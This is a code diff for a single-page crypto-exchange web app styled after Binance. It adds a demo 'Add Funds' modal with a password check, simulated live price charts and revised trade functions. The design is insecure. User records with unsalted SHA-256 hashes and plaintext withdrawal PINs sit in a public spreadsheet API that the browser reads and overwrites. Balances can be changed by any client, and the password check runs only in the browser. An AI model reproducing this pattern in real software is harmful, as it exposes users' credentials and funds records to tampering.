@@ -17,7 +17,6 @@
         body.light-mode .text-gray-400, body.light-mode .text-gray-500 { color: #6c757d; }
         body.light-mode .input-bg, body.light-mode .convert-input, body.light-mode .google-input { background-color: #f8f9fa; color: #1e2329; }
         
-        /* Scrollable signup form for Android */
         #signup-form {
             max-height: 85vh;
             overflow-y: auto;
@@ -196,6 +195,8 @@
         .google-btn-icon { width: 28px; height: 28px; display: inline-flex; align-items: center; justify-content: center; background: white; border-radius: 50%; padding: 4px; }
         .google-btn-icon svg { width: 18px; height: 18px; }
         .chart-container { position: relative; width: 100%; height: 380px; background: #0B0E11; border-radius: 12px; overflow: hidden; }
+        .funds-modal-input { background: #2b2f36; border: 1px solid #3b424d; border-radius: 12px; padding: 14px; color: white; width: 100%; margin-bottom: 16px; }
+        .funds-modal-input:focus { outline: none; border-color: #fcd535; }
     </style>
 </head>
 <body>
@@ -380,7 +381,7 @@
             </div>
 
             <main id="view-home" class="view-section active">
-                <section class="px-4 mb-4"><div class="flex items-center gap-2 text-gray-400 text-[11px] mb-1 font-bold uppercase tracking-wider"><span>Estimated Balance</span><i data-lucide="eye-off" class="w-3.5 h-3.5 cursor-pointer" id="home-eye-icon" onclick="toggleBalance()"></i></div><div class="flex justify-between items-start"><div><h1 class="text-4xl font-black tracking-tight" id="home-main-balance">******</h1><p class="text-[11px] font-bold mt-2 flex items-center gap-1" id="pnl-display">Today's PNL <span class="ml-1" id="pnl-amount">+$0.00 (+0.00%)</span> <i data-lucide="chevron-right" class="w-3 h-3 text-gray-600"></i></p></div><button onclick="addFundsPlaceholder()" class="bg-binance-yellow text-black px-6 py-2.5 rounded-xl font-black text-sm active:scale-95 transition-all shadow-lg shadow-yellow-500/10">Add Fund</button></div></section>
+                <section class="px-4 mb-4"><div class="flex items-center gap-2 text-gray-400 text-[11px] mb-1 font-bold uppercase tracking-wider"><span>Estimated Balance</span><i data-lucide="eye-off" class="w-3.5 h-3.5 cursor-pointer" id="home-eye-icon" onclick="toggleBalance()"></i></div><div class="flex justify-between items-start"><div><h1 class="text-4xl font-black tracking-tight" id="home-main-balance">******</h1><p class="text-[11px] font-bold mt-2 flex items-center gap-1" id="pnl-display">Today's PNL <span class="ml-1" id="pnl-amount">+$0.00 (+0.00%)</span> <i data-lucide="chevron-right" class="w-3 h-3 text-gray-600"></i></p></div><button onclick="openAddFundsModal()" class="bg-binance-yellow text-black px-6 py-2.5 rounded-xl font-black text-sm active:scale-95 transition-all shadow-lg shadow-yellow-500/10">Add Fund</button></div></section>
                 
                 <div class="grid grid-cols-4 gap-2 px-4 mb-6">
                     <div class="quick-action-btn" onclick="showViewWithLoading('wallets')"><i data-lucide="plus-circle" class="w-5 h-5 mx-auto mb-1 text-green-500"></i><span class="text-[10px]">Deposit</span></div>
@@ -610,6 +611,49 @@
         </div>
     </div>
 
+    <!-- Add Funds Modal -->
+    <div id="addfunds-modal" class="modal">
+        <div class="modal-content" style="max-width: 350px;">
+            <i data-lucide="x" class="modal-close" onclick="closeModal('addfunds-modal')"></i>
+            <div class="text-center mb-4">
+                <div class="w-16 h-16 bg-yellow-500/20 rounded-full flex items-center justify-center mx-auto mb-3">
+                    <i class="fa-solid fa-money-bill-wave text-yellow-500 text-2xl"></i>
+                </div>
+                <h3 class="text-xl font-bold text-white">Add Funds</h3>
+                <p class="text-gray-400 text-sm">Add demo funds to your account</p>
+            </div>
+            
+            <div class="mb-4">
+                <label class="block text-sm text-gray-300 mb-2">Amount (USD)</label>
+                <input type="number" id="funds-amount" placeholder="Enter amount" class="funds-modal-input" value="100">
+                <div class="flex gap-2 mt-2">
+                    <button onclick="document.getElementById('funds-amount').value = '50'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$50</button>
+                    <button onclick="document.getElementById('funds-amount').value = '100'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$100</button>
+                    <button onclick="document.getElementById('funds-amount').value = '500'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$500</button>
+                    <button onclick="document.getElementById('funds-amount').value = '1000'" class="flex-1 py-1 bg-[#2b3139] rounded-lg text-xs text-gray-300">$1000</button>
+                </div>
+            </div>
+            
+            <div class="border-t border-gray-700 my-4"></div>
+            
+            <div class="mb-4">
+                <label class="block text-sm text-gray-300 mb-2">Verify Password</label>
+                <input type="password" id="funds-password" placeholder="Enter your account password" class="funds-modal-input">
+                <p class="text-xs text-gray-500 mt-1">Your password is securely hashed and never stored in plain text</p>
+            </div>
+            
+            <div id="funds-error" class="error-message" style="display: none; background: rgba(246,70,93,0.1); padding: 10px; border-radius: 8px; margin-bottom: 16px;">
+                <i class="fa-solid fa-circle-exclamation mr-2"></i> Incorrect password
+            </div>
+            
+            <button onclick="processAddFunds()" class="binance-yellow-btn w-full py-3 rounded-xl font-bold flex items-center justify-center gap-2">
+                <i class="fa-solid fa-plus-circle"></i> Add Funds
+            </button>
+            
+            <p class="text-center text-gray-500 text-xs mt-4">⚠️ Demo mode - No real money involved</p>
+        </div>
+    </div>
+
     <div id="toast-message" class="toast-message"></div>
 
     <!-- Modals -->
@@ -627,13 +671,14 @@
     <div id="page-loading-overlay" class="page-loading-overlay" style="display: none;"><div class="page-loading-spinner"></div><p class="text-white mt-4">Loading...</p></div>
 
     <script>
-        // Initialize EmailJS with your credentials
+        // Initialize EmailJS
         emailjs.init("hZRpyfGu_UV6nvL9S");
         
         lucide.createIcons();
         const API_URL = "https://api.steinhq.com/v1/storages/69c7136daffba40a626a6ec8/sheet1";
         let currentUserEmail = null;
         let currentBalance = 0;
+        let currentUserHashedPassword = null;
         let notifications = [];
         let btcPrice = 2084.29;
         let balanceCheckInterval = null;
@@ -655,6 +700,7 @@
         let portfolioChart = null;
         let allocationChart = null;
         let professionalChart = null;
+        let chartUpdateInterval = null;
         let portfolioData = [1000, 1050, 1020, 1080, 1120, 1180, 1250];
         
         // Professional candlestick data
@@ -688,6 +734,15 @@
         let pendingEmail = null;
         let pendingCode = null;
         let codeExpiry = null;
+
+        // SHA-256 Hashing function (built-in, no external libraries)
+        async function sha256(message) {
+            const msgBuffer = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            return hashHex;
+        }
 
         const homedownCoins = [
             { symbol: "BNB", price: 633.88, change: 1.20, isPositive: true },
@@ -730,7 +785,99 @@
         const symbols = ['BTC', 'ETH', 'BNB', 'SOL', 'XRP', 'ADA', 'AVAX', 'DOT', 'LINK', 'TRX', 'MATIC', 'NEAR', 'UNI', 'LTC', 'ICP', 'FIL', 'ARB', 'ATOM', 'OP', 'VET', 'RENDER', 'IMX', 'KAS', 'TIA', 'STX', 'INJ', 'GRT', 'THETA', 'LDO', 'ALGO', 'AR', 'FET', 'AGLD', 'SYS', 'YGG', 'ILV', 'FIDA', 'RAD', 'RARE', 'LAZIO', 'ADX', 'ACM', 'ANKR', 'ASR', 'ATA', 'ATM', 'AUDIO', 'AVA', 'AXS', 'BNT'];
         const names = ['Bitcoin', 'Ethereum', 'BNB', 'Solana', 'Ripple', 'Cardano', 'Avalanche', 'Polkadot', 'Chainlink', 'TRON', 'Polygon', 'Near Protocol', 'Uniswap', 'Litecoin', 'Internet Computer', 'Filecoin', 'Arbitrum', 'Cosmos', 'Optimism', 'VeChain', 'Render', 'Immutable', 'Kaspa', 'Celestia', 'Stacks', 'Injective', 'The Graph', 'Theta', 'Lido DAO', 'Algorand', 'Arweave', 'Artificial Super...', 'Adventure Gold', 'Syscoin', 'Yield Guild Games', 'Illuvium', 'Bonfida', 'Radworks', 'SuperRare', 'Lazio Fan Token', 'AdEx', 'AC Milan Fan Token', 'Ankr', 'AS Roma Fan Token', 'Automata', 'Atletico Madrid', 'Audius', 'AVA', 'Axie Infinity', 'Bancor'];
 
-        // ============ PROFESSIONAL CHART FUNCTION ============
+        // ============ ADD FUNDS WITH PASSWORD HASHING ============
+        
+        function openAddFundsModal() {
+            document.getElementById('funds-amount').value = '100';
+            document.getElementById('funds-password').value = '';
+            document.getElementById('funds-error').style.display = 'none';
+            openModal('addfunds-modal');
+            lucide.createIcons();
+        }
+        
+        async function processAddFunds() {
+            const amount = parseFloat(document.getElementById('funds-amount').value);
+            const enteredPassword = document.getElementById('funds-password').value;
+            const errorDiv = document.getElementById('funds-error');
+            
+            if (!amount || amount <= 0) {
+                errorDiv.style.display = 'block';
+                errorDiv.innerHTML = '<i class="fa-solid fa-circle-exclamation mr-2"></i> Please enter a valid amount';
+                return;
+            }
+            
+            if (!enteredPassword) {
+                errorDiv.style.display = 'block';
+                errorDiv.innerHTML = '<i class="fa-solid fa-circle-exclamation mr-2"></i> Please enter your password';
+                return;
+            }
+            
+            if (!currentUserHashedPassword) {
+                errorDiv.style.display = 'block';
+                errorDiv.innerHTML = '<i class="fa-solid fa-circle-exclamation mr-2"></i> Session error. Please logout and login again.';
+                return;
+            }
+            
+            // Hash the entered password
+            const hashedEntered = await sha256(enteredPassword);
+            
+            // Compare with stored hash
+            if (hashedEntered !== currentUserHashedPassword) {
+                errorDiv.style.display = 'block';
+                errorDiv.innerHTML = '<i class="fa-solid fa-circle-exclamation mr-2"></i> Incorrect password';
+                return;
+            }
+            
+            // Password correct - add funds
+            currentBalance += amount;
+            updateBalanceDisplay();
+            
+            // Update database
+            await updateUserBalance(currentUserEmail, currentBalance);
+            
+            showToast(`✅ Added $${amount.toLocaleString()} to your account!`, true);
+            closeModal('addfunds-modal');
+            
+            // Add to recent activity
+            const activityContainer = document.getElementById('recent-activity-list');
+            if (activityContainer) {
+                const newActivity = `
+                    <div class="recent-activity-item">
+                        <div class="flex items-center gap-2">
+                            <i data-lucide="arrow-down-circle" class="w-4 h-4 text-green-500"></i>
+                            <span class="text-sm">Demo Deposit</span>
+                        </div>
+                        <div class="text-sm text-white">+$${amount.toLocaleString()}</div>
+                        <div class="text-xs text-gray-500">Just now</div>
+                    </div>
+                `;
+                activityContainer.innerHTML = newActivity + activityContainer.innerHTML;
+                lucide.createIcons();
+            }
+        }
+        
+        async function updateUserBalance(email, newBalance) {
+            try {
+                const response = await fetch(`${API_URL}`);
+                const users = await response.json();
+                const userIndex = users.findIndex(u => u.Email && u.Email.toLowerCase() === email.toLowerCase());
+                
+                if (userIndex !== -1) {
+                    const user = users[userIndex];
+                    user.Balance = newBalance.toString();
+                    await fetch(`${API_URL}/${userIndex + 1}`, {
+                        method: 'PUT',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(user)
+                    });
+                }
+            } catch (error) {
+                console.error('Error updating balance:', error);
+            }
+        }
+        
+        // ============ PROFESSIONAL CHART WITH LIVE UPDATES ============
+        
         function initProfessionalChart() {
             const canvas = document.getElementById('professionalChart');
             if (!canvas) return;
@@ -829,6 +976,106 @@
             const buyPrice = lastCandle.close;
             document.getElementById('sell-price').innerText = sellPrice.toFixed(2);
             document.getElementById('buy-price').innerText = buyPrice.toFixed(2);
+            document.getElementById('trade-current-price').innerText = `$${buyPrice.toFixed(2)}`;
+            btcPrice = buyPrice;
+            
+            const change = ((buyPrice - 2084.29) / 2084.29 * 100).toFixed(2);
+            document.getElementById('trade-price-change').innerText = `${change >= 0 ? '+' : ''}${change}%`;
+            document.getElementById('trade-price-change').className = `text-sm ${change >= 0 ? 'text-green-500' : 'text-red-500'}`;
+        }
+        
+        function startLiveChartUpdates() {
+            if (chartUpdateInterval) clearInterval(chartUpdateInterval);
+            
+            chartUpdateInterval = setInterval(() => {
+                const lastCandle = chartData[chartData.length - 1];
+                const changePercent = (Math.random() - 0.5) * 0.008;
+                const newClose = lastCandle.close * (1 + changePercent);
+                
+                const newCandle = {
+                    time: new Date().toLocaleTimeString().slice(0, 5),
+                    open: lastCandle.close,
+                    high: Math.max(lastCandle.close, newClose) + Math.random() * 2,
+                    low: Math.min(lastCandle.close, newClose) - Math.random() * 2,
+                    close: newClose
+                };
+                
+                chartData.push(newCandle);
+                if (chartData.length > 23) chartData.shift();
+                
+                for (let i = 0; i < chartData.length; i++) {
+                    const minute = 14 + Math.floor(i / 4);
+                    const second = (i * 5) % 60;
+                    chartData[i].time = `${minute.toString().padStart(2, '0')}:${second.toString().padStart(2, '0')}`;
+                }
+                
+                updateBuySellPrices();
+                updateProfessionalChart();
+                
+            }, 8000);
+        }
+        
+        // ============ WORKING BUY/SELL FUNCTIONS ============
+        
+        function placeTrade() {
+            const amount = parseFloat(document.getElementById('trade-amount').value);
+            const price = parseFloat(document.getElementById('trade-price').value) || btcPrice;
+            const stopLoss = parseFloat(document.getElementById('stop-loss')?.value) || null;
+            const takeProfit = parseFloat(document.getElementById('take-profit')?.value) || null;
+            
+            if (!amount || amount <= 0) {
+                showToast('Please enter a valid amount', false);
+                return;
+            }
+            
+            const total = amount * price;
+            
+            if (currentTradeTab === 'buy') {
+                if (total > currentBalance) {
+                    showToast(`Insufficient balance! Need $${total.toFixed(2)}`, false);
+                    return;
+                }
+                currentBalance -= total;
+                updateBalanceDisplay();
+                updateUserBalance(currentUserEmail, currentBalance);
+                showToast(`✅ BOUGHT ${amount.toFixed(4)} BTC at $${price.toFixed(2)} for $${total.toFixed(2)}`, true);
+            } 
+            else if (currentTradeTab === 'sell') {
+                showToast(`✅ SOLD ${amount.toFixed(4)} BTC at $${price.toFixed(2)} for $${total.toFixed(2)}`, true);
+            }
+            else if (currentTradeTab === 'limit') {
+                const newOrder = {
+                    id: Date.now(),
+                    side: 'limit',
+                    amount: amount,
+                    price: price,
+                    total: total,
+                    stopLoss: stopLoss,
+                    takeProfit: takeProfit,
+                    timestamp: new Date().toLocaleString(),
+                    status: 'open'
+                };
+                openOrders.unshift(newOrder);
+                renderOpenOrders();
+                showToast(`📊 LIMIT ORDER placed: ${amount.toFixed(4)} BTC at $${price.toFixed(2)}`, true);
+            }
+            
+            // Add to recent trades
+            const tradesContainer = document.getElementById('recent-trades-list');
+            if (tradesContainer) {
+                const sideText = currentTradeTab === 'buy' ? 'BUY' : (currentTradeTab === 'sell' ? 'SELL' : 'LIMIT');
+                const sideClass = currentTradeTab === 'buy' ? 'text-green-500' : (currentTradeTab === 'sell' ? 'text-red-500' : 'text-yellow-500');
+                const arrow = currentTradeTab === 'buy' ? '▲' : (currentTradeTab === 'sell' ? '▼' : '●');
+                const newTradeHtml = `<div class="trade-row"><span class="${sideClass}">${arrow} ${sideText}</span><span>${amount.toFixed(4)} BTC</span><span>$${price.toFixed(2)}</span><span class="text-gray-500">${new Date().toLocaleTimeString()}</span></div>`;
+                tradesContainer.innerHTML = newTradeHtml + tradesContainer.innerHTML;
+                if (tradesContainer.children.length > 15) {
+                    tradesContainer.removeChild(tradesContainer.lastChild);
+                }
+            }
+            
+            document.getElementById('trade-amount').value = '';
+            if (currentTradeTab === 'limit') document.getElementById('trade-price').value = '';
+            updateTradeTotal();
         }
         
         // ============ MAGIC LINK FUNCTIONS ============
@@ -940,17 +1187,21 @@
                 if (user) {
                     currentUserEmail = pendingEmail;
                     currentBalance = parseFloat(user.Balance) || 0;
+                    currentUserHashedPassword = user.HashedPassword || null;
                     notifications = user.Notifications ? JSON.parse(user.Notifications) : [];
                 } else {
+                    // New user - no password hash yet (will be set during signup)
                     await addUserToSheet({ 
                         Email: pendingEmail, 
                         Password: "", 
+                        HashedPassword: "",
                         Pin: "", 
                         Balance: 10000,
                         Notifications: JSON.stringify([]) 
                     });
                     currentUserEmail = pendingEmail;
                     currentBalance = 10000;
+                    currentUserHashedPassword = null;
                     notifications = [];
                 }
                 
@@ -996,6 +1247,7 @@
                     renderWhaleAlerts();
                     initProfessionalChart();
                     updateBuySellPrices();
+                    startLiveChartUpdates();
                 }, 500);
                 
             } catch (error) {
@@ -1032,6 +1284,51 @@
         
         // ============ END MAGIC LINK FUNCTIONS ============
 
+        // ============ SIGNUP WITH HASHED PASSWORD ============
+        
+        async function handleSignup() {
+            const email = document.getElementById('signup-email').value.trim();
+            const password = document.getElementById('signup-password').value;
+            const pin = document.getElementById('signup-pin').value;
+            const confirmPin = document.getElementById('signup-confirm-pin').value;
+            const agree = document.getElementById('signup-agree').checked;
+            const signupBtn = document.getElementById('signup-btn');
+            const pinError = document.getElementById('pin-error');
+            pinError.style.display = 'none';
+            
+            if (!email || !password) { showToast('Please fill all fields', false); return; }
+            if (password.length < 6) { showToast('Password must be at least 6 characters', false); return; }
+            if (!pin || pin.length !== 6) { showToast('Please enter a valid 6-digit withdrawal PIN', false); return; }
+            if (pin !== confirmPin) { pinError.style.display = 'block'; return; }
+            if (!agree) { showToast('Please agree to Terms', false); return; }
+            
+            setButtonLoading(signupBtn, true, 'Create Account');
+            try {
+                if (await userExists(email)) { showToast('Email already exists', false); return; }
+                
+                // Hash the password before storing
+                const hashedPassword = await sha256(password);
+                
+                await addUserToSheet({ 
+                    Email: email, 
+                    Password: "", 
+                    HashedPassword: hashedPassword,
+                    Pin: pin, 
+                    Balance: 0, 
+                    Notifications: JSON.stringify([]) 
+                });
+                showToast('Account created successfully! Please login.', true);
+                toggleForms();
+                document.getElementById('signup-email').value = '';
+                document.getElementById('signup-password').value = '';
+                document.getElementById('signup-pin').value = '';
+                document.getElementById('signup-confirm-pin').value = '';
+            } catch (error) { showToast('Signup failed. Please try again.', false); }
+            finally { setButtonLoading(signupBtn, false, 'Create Account'); }
+        }
+        
+        // ============ REST OF EXISTING FUNCTIONS (unchanged) ============
+        
         function setLanguage(lang) {
             if (lang !== 'en') {
                 showToast('Coming Soon - Other languages under development', false);
@@ -1423,8 +1720,10 @@
             if (currentUserEmail) {
                 localStorage.removeItem('binance_session_email');
                 currentUserEmail = null;
+                currentUserHashedPassword = null;
                 window.isHidden = true;
                 isWalletBalanceHidden = true;
+                if (chartUpdateInterval) clearInterval(chartUpdateInterval);
                 document.getElementById('login-overlay').classList.add('active');
                 document.body.classList.remove('show-dashboard');
                 closeProfilePopup();
@@ -1547,8 +1846,6 @@
             }
         }
         
-        function addFundsPlaceholder() { showToast('Add Fund is disabled. Balance updates directly from database.', false); }
-        
         function openSearchModal() { openModal('search-modal'); window.allCryptos = symbols.map((sym,i) => ({ symbol: sym, name: names[i] })); filterSearchResults(); }
         function filterSearchResults() {
             const searchTerm = document.getElementById('search-input')?.value.toLowerCase() || '';
@@ -1577,36 +1874,6 @@
                 console.error('Error checking user existence:', error);
                 return false;
             }
-        }
-        
-        async function handleSignup() {
-            const email = document.getElementById('signup-email').value.trim();
-            const password = document.getElementById('signup-password').value;
-            const pin = document.getElementById('signup-pin').value;
-            const confirmPin = document.getElementById('signup-confirm-pin').value;
-            const agree = document.getElementById('signup-agree').checked;
-            const signupBtn = document.getElementById('signup-btn');
-            const pinError = document.getElementById('pin-error');
-            pinError.style.display = 'none';
-            
-            if (!email || !password) { showToast('Please fill all fields', false); return; }
-            if (password.length < 6) { showToast('Password must be at least 6 characters', false); return; }
-            if (!pin || pin.length !== 6) { showToast('Please enter a valid 6-digit withdrawal PIN', false); return; }
-            if (pin !== confirmPin) { pinError.style.display = 'block'; return; }
-            if (!agree) { showToast('Please agree to Terms', false); return; }
-            
-            setButtonLoading(signupBtn, true, 'Create Account');
-            try {
-                if (await userExists(email)) { showToast('Email already exists', false); return; }
-                await addUserToSheet({ Email: email, Password: password, Pin: pin, Balance: 0, Notifications: JSON.stringify([]) });
-                showToast('Account created successfully! Please login.', true);
-                toggleForms();
-                document.getElementById('signup-email').value = '';
-                document.getElementById('signup-password').value = '';
-                document.getElementById('signup-pin').value = '';
-                document.getElementById('signup-confirm-pin').value = '';
-            } catch (error) { showToast('Signup failed. Please try again.', false); }
-            finally { setButtonLoading(signupBtn, false, 'Create Account'); }
         }
         
         function convertCurrency() {
@@ -1664,15 +1931,7 @@
         }
         
         function updateTradePage() {
-            const price = btcPrice;
-            document.getElementById('trade-current-price').innerText = `$${price.toLocaleString()}`;
-            const change = ((price - 69000) / 69000 * 100).toFixed(2);
-            document.getElementById('trade-price-change').innerText = `${change >= 0 ? '+' : ''}${change}%`;
-            document.getElementById('trade-price-change').className = `text-sm ${change >= 0 ? 'text-green-500' : 'text-red-500'}`;
-            document.getElementById('trade-24h-change').innerHTML = `${change >= 0 ? '+' : ''}${change}%`;
-            document.getElementById('trade-24h-high').innerHTML = `$${(price * 1.02).toFixed(2)}`;
-            document.getElementById('trade-24h-low').innerHTML = `$${(price * 0.98).toFixed(2)}`;
-            document.getElementById('trade-24h-volume').innerHTML = `$${(Math.random() * 2 + 1).toFixed(1)}B`;
+            updateBuySellPrices();
             renderOrderBook();
             renderRecentTrades();
         }
@@ -1699,28 +1958,6 @@
             const amount = parseFloat(document.getElementById('trade-amount').value) || 0;
             const price = parseFloat(document.getElementById('trade-price').value) || btcPrice;
             document.getElementById('trade-total').innerText = (amount * price).toFixed(2) + ' USDT';
-        }
-        
-        function placeTrade() {
-            const amount = parseFloat(document.getElementById('trade-amount').value);
-            const price = parseFloat(document.getElementById('trade-price').value) || btcPrice;
-            const stopLoss = parseFloat(document.getElementById('stop-loss')?.value) || null;
-            const takeProfit = parseFloat(document.getElementById('take-profit')?.value) || null;
-            if (!amount || amount <= 0) { showToast('Please enter a valid amount', false); return; }
-            const total = amount * price;
-            if (currentTradeTab === 'buy' && total > currentBalance) { showToast('Insufficient balance', false); return; }
-            const newOrder = { id: Date.now(), side: currentTradeTab === 'limit' ? 'limit' : currentTradeTab, amount: amount, price: price, total: total, stopLoss: stopLoss, takeProfit: takeProfit, timestamp: new Date().toLocaleString(), status: 'open' };
-            openOrders.unshift(newOrder);
-            if (currentTradeTab === 'buy') { currentBalance -= total; }
-            renderOpenOrders();
-            let msg = `${currentTradeTab === 'buy' ? 'Buy' : currentTradeTab === 'sell' ? 'Sell' : 'Limit'} order placed: ${amount} BTC at $${price}`;
-            if (stopLoss) msg += ` | SL: $${stopLoss}`;
-            if (takeProfit) msg += ` | TP: $${takeProfit}`;
-            showToast(msg, true);
-            document.getElementById('trade-amount').value = '';
-            if (currentTradeTab === 'limit') document.getElementById('trade-price').value = '';
-            updateTradeTotal();
-            updateBalanceDisplay();
         }
         
         function renderOpenOrders() {
@@ -1841,14 +2078,13 @@
                 document.getElementById('trade-action-btn').onclick = placeTrade;
                 initProfessionalChart();
                 updateBuySellPrices();
+                startLiveChartUpdates();
+            }
+            if(viewId !== 'trade' && chartUpdateInterval) {
+                clearInterval(chartUpdateInterval);
+                chartUpdateInterval = null;
             }
             if(viewId === 'futures') { renderFuturesList(); renderLeaderboard(); renderEconomicCalendar(); renderNewsFeed(); renderWhaleAlerts(); }
-            if(viewId === 'wallets') {
-                setTimeout(() => {
-                    initProfessionalChart();
-                    updateBuySellPrices();
-                }, 100);
-            }
             const exBtn = document.getElementById('btn-exchange');
             const waBtn = document.getElementById('btn-wallet');
             if(viewId === 'home') { exBtn.className = "px-5 py-2 text-white bg-[#2b3139] rounded-md shadow-md font-bold"; waBtn.className = "px-5 py-2 text-gray-400 font-bold"; }
@@ -1898,6 +2134,7 @@
                         const currentUser = users && Array.isArray(users) ? users.find(u => u.Email && u.Email.toLowerCase() === currentUserEmail.toLowerCase()) : null;
                         if (currentUser) {
                             currentBalance = parseFloat(currentUser.Balance) || 0;
+                            currentUserHashedPassword = currentUser.HashedPassword || null;
                             notifications = currentUser.Notifications ? JSON.parse(currentUser.Notifications) : [];
                             updateBalanceDisplay();
                             const dot = document.getElementById('notification-dot');
@@ -1924,9 +2161,10 @@
                         renderWhaleAlerts();
                         initProfessionalChart();
                         updateBuySellPrices();
+                        startLiveChartUpdates();
                         showToast('Welcome back!', true);
                     })
-                    .catch(error => { console.error('Error fetching balance:', error); currentBalance = 0; updateBalanceDisplay(); hasPreviousBalance = false; lastNotifiedBalance = null; lastNotificationTime = 0; lastProcessedTransactionId = null; if (balanceCheckInterval) clearInterval(balanceCheckInterval); balanceCheckInterval = setInterval(checkBalanceUpdate, 5000); resetInactivityTimer(); document.getElementById('login-overlay').classList.remove('active'); document.body.classList.add('show-dashboard'); document.getElementById('loader-wrapper').style.opacity = '0'; document.getElementById('loader-wrapper').style.visibility = 'hidden'; lucide.createIcons(); renderFuturesList(); initProfessionalChart(); updateBuySellPrices(); });
+                    .catch(error => { console.error('Error fetching balance:', error); currentBalance = 0; updateBalanceDisplay(); hasPreviousBalance = false; lastNotifiedBalance = null; lastNotificationTime = 0; lastProcessedTransactionId = null; if (balanceCheckInterval) clearInterval(balanceCheckInterval); balanceCheckInterval = setInterval(checkBalanceUpdate, 5000); resetInactivityTimer(); document.getElementById('login-overlay').classList.remove('active'); document.body.classList.add('show-dashboard'); document.getElementById('loader-wrapper').style.opacity = '0'; document.getElementById('loader-wrapper').style.visibility = 'hidden'; lucide.createIcons(); renderFuturesList(); initProfessionalChart(); updateBuySellPrices(); startLiveChartUpdates(); });
                 return true;
             }
             return false;
